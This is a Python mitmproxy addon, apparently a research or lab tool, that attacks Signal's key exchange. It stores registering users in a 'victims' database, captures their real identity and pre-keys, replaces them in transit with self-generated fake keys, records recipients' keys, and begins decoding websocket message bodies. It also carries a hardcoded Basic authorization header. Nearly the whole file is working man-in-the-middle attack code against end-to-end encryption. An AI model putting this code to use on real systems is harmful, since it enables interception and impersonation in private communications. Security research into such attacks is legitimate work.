import subprocess
import os
import json
import requests
from mitmproxy import flow, http, ctx
import sqlite3
from setup import setup_db
import base64
import re
from proto_python.wire_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python.storage_pb2 import *
from proto_python.WebSocketResources_pb2 import *
from proto_python import *
from test_protocol import *


def try_run_sudo(cmd):
    try_run(f"sudo {cmd}")


def try_run(cmd: str):
    try:
        res = subprocess.run(cmd, shell=True, check=True, stdout=open(os.devnull, "wb"))
        # print(res.returncode)
    except subprocess.CalledProcessError as e:
        print(f"cmd fucked: {e}\n{cmd}")


def fake_key_gen(preKeysId=1, signedKeyId=1):
    try_run("node ./node-signal/index.js")

    p = subprocess.Popen(
        ["node", "./node-signal/index.js", "100"], stdout=subprocess.PIPE
    )
    out = p.stdout.read()

    keys = json.loads(out)

    identity_key = (keys["identityKey"]["privateKey"], keys["identityKey"]["publicKey"])
    signedPre_key = (
        keys["signedPreKey"]["privateKey"],
        keys["signedPreKey"]["publicKey"],
        keys["signedPreKey"]["signature"],
    )

    preKeys = [(i["privKey"], i["pubKey"]) for i in keys["preKeys"]]

    # print(identity_key, signedPre_key, preKeys)

    fake_keys = {
        "identityKey": identity_key[1],
        "preKeys": [
            {"keyId": preKeysId + id, "publicKey": key[1]}
            for id, key in enumerate(preKeys)
        ],
        "signedPreKey": {
            "keyId": signedKeyId,
            "publicKey": signedPre_key[1],
            "signature": signedPre_key[2],
        },
    }

    # fake_keys_json = json.dumps(fake_keys, indent=4)
    one_time_keys = fake_keys

    # one_time_keys.pop("signedPreKey")
    # one_time_keys["identityKey"] = "Bd+PfqCkOUocwUguUiW5zCdj2/wg2hD0vN97YYk1KPwD"
    # one_time_keys.pop("identityKey")

    headers = {
        "Authorization": "Basic ZTdkNzFhZWEtYzQxYS00ZDg4LTg1NmItMDJlOTc5OTg4NjNhOjRvd1dGeGRGR2FqeXFPOHJrUTFmTUJkVA==",
        "X-Signal-Agent": "OWA",
        "User-Agent": "Signal-Android/6.18.4 Android/31",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "chat.staging.signal.org",
        "Connection": "Keep-Alive",
    }

    # payload = "{\"identityKey\":\"BYW63VEybfR3OF9Pt0qu2+AQ0EF5TikTcfiM/GsxnMph\",\"preKeys\":[{\"keyId\":4223788,\"publicKey\":\"BTxkj8O9E75onyVN7Alj1lqv9ihg0rbD0XxoI21d5VdT\"},{\"keyId\":4223789,\"publicKey\":\"BeEOaXf93mC00vMu7ghPTXY6+IWCqfG5BDID6+tm3g9d\"},{\"keyId\":4223790,\"publicKey\":\"BTbbK5IzN1t6dxQZDSbHwcCHG1cEfkdGUzQsW0yHBcUo\"},{\"keyId\":4223791,\"publicKey\":\"BafRMu+ybG22YNwVxRqDh20Yj6jmToQrV3sEEHm4li5Y\"},{\"keyId\":4223792,\"publicKey\":\"BYTBjL45f3UR2LDTHmICfkJbZ93LU//4M+3qoyc7Xl4+\"},{\"keyId\":4223793,\"publicKey\":\"BSPbHM3khhX841YfRNv8prq/2Vz8WuxJo08dC3SP9+Zi\"},{\"keyId\":4223794,\"publicKey\":\"BR6uHJwgYhgWUv6O3H2RWLVTqHP9bSN8IZxAyafhUZps\"},{\"keyId\":4223795,\"publicKey\":\"Bdr4tg2J20MqM/wruk9Gd7wR+McPWOHA7haiY/1ZX8wK\"},{\"keyId\":4223796,\"publicKey\":\"Bd0UnS9EIKaa/3Ouwxipw2KkkaYSHjUqgUByaG5Za1QY\"},{\"keyId\":4223797,\"publicKey\":\"BUNaikgIHgzQgq8DxPVy5X4lamqebdbl6MORgYRMuyM4\"},{\"keyId\":4223798,\"publicKey\":\"Bc2waMV7NIxU4skn/2naMt5Cizw5DpV3z623uu2nP01o\"},{\"keyId\":4223799,\"publicKey\":\"BRGGprJt3+tGNT6mirjx2dABeXgn1AgIRY2TCC5RfABH\"},{\"keyId\":4223800,\"publicKey\":\"BaYW/6O41i+4udh/mX7S3XWVFs/pcmKf997rVvLU5mBM\"},{\"keyId\":4223801,\"publicKey\":\"BbOmQlgSUnJ0ffsAE27Bm2kEnjcFMfDQG+b0023mcJN5\"},{\"keyId\":4223802,\"publicKey\":\"BXTs48ekQ0GD8kCqBj8dvU3fUCJkk4Zsedcxx/Wh/ptl\"},{\"keyId\":4223803,\"publicKey\":\"BSDc9ft1ChyGie98nWiuLLdqZDKGrFbtXIuyWre4Pupo\"},{\"keyId\":4223804,\"publicKey\":\"BbE6c82KOvQeGaodx1yeKVCdBfN006sqWickTAdMJoJ1\"},{\"keyId\":4223805,\"publicKey\":\"BU0hJrjpybEIUbcdoatN64g1tCpUGAznTBfQScZs215O\"},{\"keyId\":4223806,\"publicKey\":\"BcrPMPFmsxaJo0/ZZU2VzKXlcb137RVXAW5ONdYdMncx\"},{\"keyId\":4223807,\"publicKey\":\"BazXXMbHC/zb+qg6pjpVuDEoGFrZ8I/TXagE0RjeIXd4\"},{\"keyId\":4223808,\"publicKey\":\"Bep6f8b5kKjHNErOj9F0mmAhSb7iZSMfMLZ/jOnOE6QK\"},{\"keyId\":4223809,\"publicKey\":\"BcNrRGVaXMsWYM9g2IbViXxidgWcUK9x6OlCcGsYtNkI\"},{\"keyId\":4223810,\"publicKey\":\"BSY6aXBSUG0wv3zX0OysC4xGjD8PpYLnOY6scieKGkdb\"},{\"keyId\":4223811,\"publicKey\":\"BdxgldLF9r0QLJS8lvhOxJd401DiyNTIQASMMU6732on\"},{\"keyId\":4223812,\"publicKey\":\"BUeT1VBdQAZBaC4JIdhvPZBxmXRYMzD78YG8WBabQRBt\"},{\"keyId\":4223813,\"publicKey\":\"BdyK1eT5YKtjUxQa+b08ocutmuCQHgPIVEZTvDgezRQn\"},{\"keyId\":4223814,\"publicKey\":\"Bfa3B77KmirilzcWAAStkhNAmwROynKOrDTGM2pjm1cs\"},{\"keyId\":4223815,\"publicKey\":\"Bb19Sj2gCLUdckNsifuaQjctHPXRQCFWrXZRquddVjB8\"},{\"keyId\":4223816,\"publicKey\":\"BdkFs0pcr5u/c5sSrRuGDhhRCdSNVa+qeMg307jSF5NS\"},{\"keyId\":4223817,\"publicKey\":\"BQXfvvXyQehMelLUF3IKjvDUzBzf9x1oqsMe6ckSQhg2\"},{\"keyId\":4223818,\"publicKey\":\"BWEZGBl8rO6/ZoapgQym5mSYC6B0aTH4wo7NADWXNHgz\"},{\"keyId\":4223819,\"publicKey\":\"BcHNwL10wtGu5Fp/VlDfr/qEMAwSwwpfs8Vj4Yn1QY50\"},{\"keyId\":4223820,\"publicKey\":\"Bfwy2axR1Pr9pn4h2m5MqlZoZztagcM8DBo/o5W8uCtu\"},{\"keyId\":4223821,\"publicKey\":\"Bf86WRf08jtadf/KTC+eT6DilV1N38Zc9z79WskrMMwi\"},{\"keyId\":4223822,\"publicKey\":\"BVRCIy38Zc3rPF/FYDayFfdSCEF8lD7S3SfK4bgDWadh\"},{\"keyId\":4223823,\"publicKey\":\"Bclx0TJ+Tw98+0ZJ8zoy2u5LLiUv0hTTf6AZO02ZqW0T\"},{\"keyId\":4223824,\"publicKey\":\"BU3QuG8GR0zGEcYAaY2fXtTi8DI8mWLStc2ol/vrNyIP\"},{\"keyId\":4223825,\"publicKey\":\"BRmXIRbDHmEtdiCm0xZd9leDzYiUFWqD8Y8L06ijGZc1\"},{\"keyId\":4223826,\"publicKey\":\"BX7JH8xzNttEBkEtfpeqh9+smk9rgvTlKF+yyIDU9R50\"},{\"keyId\":4223827,\"publicKey\":\"BVpWe8XXgpC7jT5qwbQdMoDtuNFqVgHE7q5tesvh+yQC\"},{\"keyId\":4223828,\"publicKey\":\"BbDsl915p9f/2nopspgGKPPYKDnBungMeYuVdQegdYh4\"},{\"keyId\":4223829,\"publicKey\":\"BWqiu3VV+POesQKz8GXt4FRZCeG4myPJtgw+8XRLHFAf\"},{\"keyId\":4223830,\"publicKey\":\"BcAaTP62gpAajqmUdnKYL0e2aLjXg/SYri9IyhhPcuMw\"},{\"keyId\":4223831,\"publicKey\":\"BbaFiZeddKvLkFYqikIUKZItZCLbaMnXKn/yVifLimQe\"},{\"keyId\":4223832,\"publicKey\":\"BWOO6KG3FSQQ5UDD12K1HOWhfZXMAFi7PoBgPJEzDtok\"},{\"keyId\":4223833,\"publicKey\":\"BSjZYPvM8rer7ISrou2DxAt1JlYmp43CmzcnQkXjSHws\"},{\"keyId\":4223834,\"publicKey\":\"BbH3k9kQbjtUf8Igpag71vrjI4BuCHWf6vsI31XNfE0U\"},{\"keyId\":4223835,\"publicKey\":\"BbcRABG4ri9DlFzZg/fiZxFnWfdjM4Uly4D0FtoXxuNE\"},{\"keyId\":4223836,\"publicKey\":\"BTDMqLiwvIDkUYz0yrIRSs+GiR14WM72owE1hdQ0l2s/\"},{\"keyId\":4223837,\"publicKey\":\"Beo7A2rvZiuvyiQgCeF2AOhBc3zWlt9w7gg5qcGrCzVo\"},{\"keyId\":4223838,\"publicKey\":\"BZBjvuXrcXScPCX9ePTKYrtX+/vll2TRY+FfYF8o4YYY\"},{\"keyId\":4223839,\"publicKey\":\"BecHWQ3t/j4Iu+iveciiiJKbwAQBwYWPFQzUSfW0bOY3\"},{\"keyId\":4223840,\"publicKey\":\"BeR7/jNoPdOUA3C2qTbs+pK9iE2fQGU4WYDlEreU/too\"},{\"keyId\":4223841,\"publicKey\":\"BXpebk3vdefPsTFK0HCLQ+LW6JbYzUz51g2dMZByT0QM\"},{\"keyId\":4223842,\"publicKey\":\"BbpKS/bteFfTw8EWbq+VKGvhR3aqo0giV/Hsy/DeerlP\"},{\"keyId\":4223843,\"publicKey\":\"Bfy4P3bDPSJMEGSPiWY+OvKmSBezKLuEPGgxdsSNk41U\"},{\"keyId\":4223844,\"publicKey\":\"BclYNSwMOL2Nt/0R79bmF66rhsPBRy03S7aCz1R9yQUh\"},{\"keyId\":4223845,\"publicKey\":\"BRPdgzAtJPB1qnVcBG0wJcla8LXtpPBu9LvRHAfpHLUw\"},{\"keyId\":4223846,\"publicKey\":\"BQyITv+bPYir6WZl3aLCICwVyM2cVVV8s4IsRxq+SnFl\"},{\"keyId\":4223847,\"publicKey\":\"BXmLxf7cbtx192Xqaq6mKt82rwkB/ZNExDTZ8b2Ubk1f\"},{\"keyId\":4223848,\"publicKey\":\"BT26cJXPXbyEI87fUWfEBUVTSo5LXGKGqPJIvPdpRSwu\"},{\"keyId\":4223849,\"publicKey\":\"BZIrcefrxQWNgmjmHn0UeWhzRx4JmH8ZJA6jsSBt6lsw\"},{\"keyId\":4223850,\"publicKey\":\"Bb0zU7VkwLrbETBKs+6xQeUCP2WmAIButyYo2PEYxyRh\"},{\"keyId\":4223851,\"publicKey\":\"Bcg1XWZ6VP86JEU895xHWvz2Iag/1PSGfNZUHJq+ITA1\"},{\"keyId\":4223852,\"publicKey\":\"BTVcAG1fjGLN8yZtWhaYp8L4ECXwK1Go68NlCUBb/0Nd\"},{\"keyId\":4223853,\"publicKey\":\"BRkfVj0bKsgML8UCdoBpJVdMfv9LgiaNEheXMxDtuyR4\"},{\"keyId\":4223854,\"publicKey\":\"BaMf/PBXCHZ2Kfb7OBZ3Oar2fuHImSH69dukskrlF9EV\"},{\"keyId\":4223855,\"publicKey\":\"BfGeaVKqvmXc69bda2xv5God5+KUxTK8Qx355l1aF3d2\"},{\"keyId\":4223856,\"publicKey\":\"BS4jIm1wWHaqYjUQXeLv+l2Obk6bZZVzvnwd9w6Io15w\"},{\"keyId\":4223857,\"publicKey\":\"BZ2aCMs+3/uN+rJUZ2H/MJOKoa5o5k6Vi1cXx0TGtxxp\"},{\"keyId\":4223858,\"publicKey\":\"BeVYjnfXlCaXnHqBVdU6OVGvR8PndJL0R8sGriMhqzlH\"},{\"keyId\":4223859,\"publicKey\":\"BYmwDPeCn2sUXagxtV+EnX41FxvptLki/mWBQ4wOPZAw\"},{\"keyId\":4223860,\"publicKey\":\"BTUj+QzZO41A7wXPafQoSDXmOqgDQvABpplDZclotOEK\"},{\"keyId\":4223861,\"publicKey\":\"BXVKk1bhfPKuqCiwro4ulSm4PZpeUuVhzOBkdfEzGkgM\"},{\"keyId\":4223862,\"publicKey\":\"BQ4njOyWmmA45p5E+p/yyY2nJtCfHvjfY31QsmVzqSRw\"},{\"keyId\":4223863,\"publicKey\":\"BcEYq3xsMFMEr4qghliI5rOssHj1X8b7P3ahuIsOZUMu\"},{\"keyId\":4223864,\"publicKey\":\"Bd0Lo1u/yNzjvGO00iEKVWfk7LZVuyX9UKbSXd4gVKYT\"},{\"keyId\":4223865,\"publicKey\":\"BdW3L3Jm6ju4iQCyRjtRKF4BEku4NiAiCw5BdaIGqb0L\"},{\"keyId\":4223866,\"publicKey\":\"Be56oMADeZWqbG63M5jtzudtEZJiwD3IoUKz99NPznpv\"},{\"keyId\":4223867,\"publicKey\":\"BUCWBLS97LfKX00rkB2JvFW8VE96IjO1eKwkhhpvj+s7\"},{\"keyId\":4223868,\"publicKey\":\"BbgvqM/ooi5eagrAPc0Pd2WDNAeHndN7s5ZTUwACwLIo\"},{\"keyId\":4223869,\"publicKey\":\"BSQUp712BR2r3/fDK24pVsd1TJ3WDS5yCZwL4Wlpizkq\"},{\"keyId\":4223870,\"publicKey\":\"Bdas/J50WNARB15P0YenV1KlU6eOPJ6wqLEFUSjzDg0A\"},{\"keyId\":4223871,\"publicKey\":\"BRQD3ybEl1kph0MSU15cC6QkbsOM2IO/1yUddQUTlEQv\"},{\"keyId\":4223872,\"publicKey\":\"BRmk5imYw2NRZRbv7O67I4/Gsqij80is4TT/PUDNgFhF\"},{\"keyId\":4223873,\"publicKey\":\"BWnDBzzg8Ij9VBvK0MYD37z8wy1aoU7I12RvunTuGwti\"},{\"keyId\":4223874,\"publicKey\":\"Bcdh2XDVtUSGHjmTqp6RMR8ewROQT/cbpEE+zQPeIYgd\"},{\"keyId\":4223875,\"publicKey\":\"BVhhjRjHJhPhTb3/MElbb/lJ2ZMvqa+jbSbS32u2iAJK\"},{\"keyId\":4223876,\"publicKey\":\"BURwrn+bQstWrjuON437gY6yLM1MNYziIRiZ811ml6ti\"},{\"keyId\":4223877,\"publicKey\":\"BSULOncxOsKKQz43hBYetM9gC9Tul2+I51b0W7ftCKd1\"},{\"keyId\":4223878,\"publicKey\":\"BRemWKcSr3qHApz9mbEn4RJEQ++Dul4YsSo/9XSVqrx0\"},{\"keyId\":4223879,\"publicKey\":\"BUN7Bc0q74qy9lp4Ssv70or3KDUFWJylCaJywOz9COxW\"},{\"keyId\":4223880,\"publicKey\":\"Bdbq4XuL/tWmytSuG9tip2uaqlAyC1qBhUgZFiJPOOpg\"},{\"keyId\":4223881,\"publicKey\":\"BfQgGR1HECwz3KrMSP0HQGMD95tCkCp3EUVw6tZTu5hG\"},{\"keyId\":4223882,\"publicKey\":\"BUi8/4cCwXIRQ4bqDET09rKQebDLIXb0H4tG/bzN1JRj\"},{\"keyId\":4223883,\"publicKey\":\"BT64fcmjnWo4H8KILsk98uKPcgprayxxKOxy17TlOv80\"},{\"keyId\":4223884,\"publicKey\":\"BZb7crWBF4R21LZRiUntkwVr7FcnVbjKtYMtpCgwnlIl\"},{\"keyId\":4223885,\"publicKey\":\"BQ5C/flbzl5XqXuQXI6yOTb/QN+Pb56oTh6Bt5Ih88Br\"},{\"keyId\":4223886,\"publicKey\":\"BQN4eVpD43Hgf9d0SzJnr2m0HAupXSj8yjMLOTqJwTdK\"},{\"keyId\":4223887,\"publicKey\":\"BU6kFwE+PCWkHv9X7/2y/RTAC3V2I70RRbVVYjbyiiMb\"}],\"signedPreKey\":{\"keyId\":6631071,\"publicKey\":\"BfpjOb1uZNWyrFkMJsm0igQQrtNm4mF+vlzxzirvY84D\",\"signature\":\"yH4Za2CmH73YSGwTzVu0bxqkLjaIMVP5kKP2kP5KcOpJkBtZ2zncA8CaFQ0dRk8ZUovdrop4GnPaUlFojFhrDA\"}}"
    # fake_keys_json = re.sub("(\w+):", r'"\1":',  fake_keys_json.dumps())
    # resp = requests.put(url="https://chat.staging.signal.org/v2/keys/?identity=aci", data= json.dumps(fake_keys_json), headers=headers)
    # print(resp.ok,resp.status_code,resp.content)
    return fake_keys


def isKnownUser(cur: sqlite3.Cursor, target: str) -> bool:
    query = f"SELECT * FROM victims WHERE pNumber = ? OR aci = ? ;"
    params = (target, target)
    result = cur.execute(query, params).fetchall()
    return len(result) > 0


def request(flow: http.HTTPFlow):
    conn = sqlite3.connect("mitm.db")
    cur = conn.cursor()

    # before checking the request, let's see if we know this bastard
    bearer = flow.request.headers.get("Authorization", None)
    knownUser, target = False, ""
    if bearer is not None:
        bearer = bearer.split("Basic ")[1]
        # base64.decode(bearer)
        target = base64.b64decode(bearer).split(b":")[0].decode()
        # sql query to check if target in aci or pnumber
        knownUser = isKnownUser(cur, target)
        # ctx.log(f"Bearer token: {bearer} (known: {knownUser})")
        # ctx.log(target)

    if "/v2/keys/" in flow.request.path and flow.request.method == "PUT":
        # make it a method, for example (replace_keys())
        if not knownUser:
            # well... nothing to do here,
            pass
        keys = {}
        try:
            keys = json.loads(flow.request.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.request.content.decode()}")
        ts = flow.timestamp_created
        identity = flow.request.query.get("identity")
        with open(f"saved/{ts}-{identity}-keys.json", "w") as f:
            f.write(json.dumps(keys))

        # pNumber, aci, pni = info["number"], info["uuid"], info["pni"]

        IdenKey, SignedPreKey, PreKeys = (
            keys["identityKey"],
            json.dumps(keys["signedPreKey"]),
            json.dumps(keys["preKeys"]),
        )

        fake_keys = fake_key_gen(
            signedKeyId=keys["signedPreKey"]["keyId"],
            preKeysId=keys["preKeys"][0]["keyId"],
        )
        # fake_pni_keys = fake_key_gen()
        fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
            fake_keys["identityKey"],
            json.dumps(fake_keys["signedPreKey"]),
            json.dumps(fake_keys["preKeys"]),
        )
        # fake_pniIdenKey, fake_pniSignedPreKey, fake_pniPreKeys = fake_pni_keys["identityKey"], fake_pni_keys["signedPreKey"], fake_pni_keys["preKeys"]

        query = f"UPDATE victims SET {identity}IdenKey = ?, {identity}SignedPreKey = ?, {identity}PreKeys = ?, {identity}FakeIdenKey = ?, {identity}FakeSignedPreKey = ?, {identity}FakePreKeys = ? WHERE pNumber = ? OR aci = ?"
        params = (
            IdenKey,
            SignedPreKey,
            PreKeys,
            fake_IdenKey,
            fake_SignedPreKey,
            fake_PreKeys,
            target,
            target,
        )

        cur.execute(query, params)

        conn.commit()
        ctx.log.info(f"Updated {identity} keys for target {target}")
        # keys["preKeys"] = fa["preKeys"]
        flow.request.content = json.dumps(fake_keys).encode()
        with open(f"saved/fake-{ts}-{identity}-keys.json", "wb") as f:
            f.write(flow.request.content)


def response(flow: http.HTTPFlow):
    conn = sqlite3.connect("mitm.db")
    cur = conn.cursor()

    # before checking the request, let's see if we know this bastard
    bearer = flow.request.headers.get("Authorization", None)

    knownUser, target = False, ""
    if bearer is not None:
        bearer = bearer.split("Basic ")[1]
        # base64.decode(bearer)
        target = base64.b64decode(bearer).split(b":")[0].decode()
        # sql query to check if target in aci or pnumber
        knownUser = isKnownUser(cur, target)

    if "/v1/registration" in flow.request.path and flow.request.method == "POST":
        try:
            resp = json.loads(flow.response.content)
            req = json.loads(flow.request.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
        with open("resp.json", "w") as f:
            f.write(json.dumps(resp))

        conn = sqlite3.connect("mitm.db")
        cur = conn.cursor()
        try:
            pNumber, aci, pni, unidentifiedAccessKey = (
                resp["number"],
                resp["uuid"],
                resp["pni"],
                req["accountAttributes"]["unidentifiedAccessKey"],
            )
            cur.execute(
                f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
                (pNumber, aci, pni, unidentifiedAccessKey),
            )
            conn.commit()
        except Exception:
            pass

    matches = re.match("\/v2\/keys\/([\w+-]+)\/(\*|\d)", flow.request.path)
    if matches and flow.request.method == "GET":
        groups = matches.groups()
        # ctx.log(f"regex matched: {groups}")
        if len(groups) != 2:
            ctx.log.error("sth is fucked")
        receiver, deviceID = groups[0], groups[1] if groups[1] != "*" else None
        try:
            info = json.loads(flow.response.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")

        # fake_keys = fake_key_gen(preKeysId=info['devices'])

        # fake_IdenKey, fake_SignedPreKey, fake_PreKeys = fake_keys["identityKey"], json.dumps(fake_keys["signedPreKey"]), json.dumps(fake_keys["preKeys"])

        ctx.log.alert(type(target))
        if target is None or target == "":
            bearer = flow.request.headers.get("Unidentified-Access-Key", None)
            #ctx.log.alert(bearer)
            res = cur.execute(
                "SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,)
            )
            target = res.fetchone()[0]
            #ctx.log(f"target : {target!r}")

        for device in info["devices"]:
            # ctx.log(params)
            fake_keys = fake_key_gen(
                preKeysId=device["preKey"]["keyId"],
                signedKeyId=device["signedPreKey"]["keyId"],
            )
            fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
                fake_keys["identityKey"],
                json.dumps(fake_keys["signedPreKey"]),
                json.dumps(fake_keys["preKeys"]),
            )
            params = (
                device["deviceId"],
                target,
                receiver,
                json.dumps(info["identityKey"]),
                json.dumps(device["signedPreKey"]),
                json.dumps(device["preKey"]),
                fake_IdenKey,
                fake_SignedPreKey,
                fake_PreKeys,
            )

            cur.execute(
                f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeIdenKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE recv_aci = ?",
                params + (receiver,),
            )
            cur.execute(
                "INSERT OR IGNORE INTO end2end (deviceId, v_aci, recv_aci, recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey) VALUES (?,?,?,?,?,?,?,?,?)",
                params,
            )
            # res = cur.execute("SELECT * from end2end")
            # ctx.log(res.fetchall())
            conn.commit()


def websocket_message(flow: http.HTTPFlow):
    cont = flow.websocket.messages
    for messages in cont:
        ctx.log(messages.content)
        pattern = b"/v1/messages"
        proto_msg = WebSocketMessage()

        if pattern in messages.content:
            ctx.log.alert("you found it")
            proto_msg.ParseFromString(messages.content)
            ctx.log.alert(proto_msg.request.body)
            message = json.loads(proto_msg.request.body)
            ctx.log.warn(message)
            
            ##### Protocol Run?
            
            message["content"]

            


#        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
#            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (pNumber, aci, pni));")
